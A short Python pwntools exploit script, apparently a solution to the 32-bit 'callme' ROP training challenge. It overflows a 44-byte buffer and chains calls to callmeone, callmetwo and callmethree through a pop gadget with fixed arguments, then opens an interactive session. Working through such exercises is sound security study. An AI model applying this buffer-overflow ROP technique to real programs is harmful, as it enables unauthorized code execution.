#!/usr/bin/python3
from pwn import *

#### ROP CHAIN #####

#### offset
payload = "A" * 44 ##offset found w/ cyclic

##
payload += "\xf0\x84\x04\x08" ## addr of callmeone 080484f0
payload += "\xf9\x87\x04\x08" ## addr of ROPGADGET 080487f9
payload += "\xef\xbe\xad\xde\xbe\xba\xfe\xca\x0d\xf0\x0d\xd0" # params 

payload += "\x50\x85\x04\x08" ##addr of callmetwo 08048550
payload += "\xf9\x87\x04\x08" ## addr of ROPGADGET 080487f9
payload += "\xef\xbe\xad\xde\xbe\xba\xfe\xca\x0d\xf0\x0d\xd0" # params 

payload += "\xe0\x84\x04\x08" ##addr of callmethree 080484e0
payload += "\xf9\x87\x04\x08" ## addr of ROPGADGET 080487f9
payload += "\xef\xbe\xad\xde\xbe\xba\xfe\xca\x0d\xf0\x0d\xd0" # params 

p = process("./callme32")

p.sendline(payload)

p.interactive() 
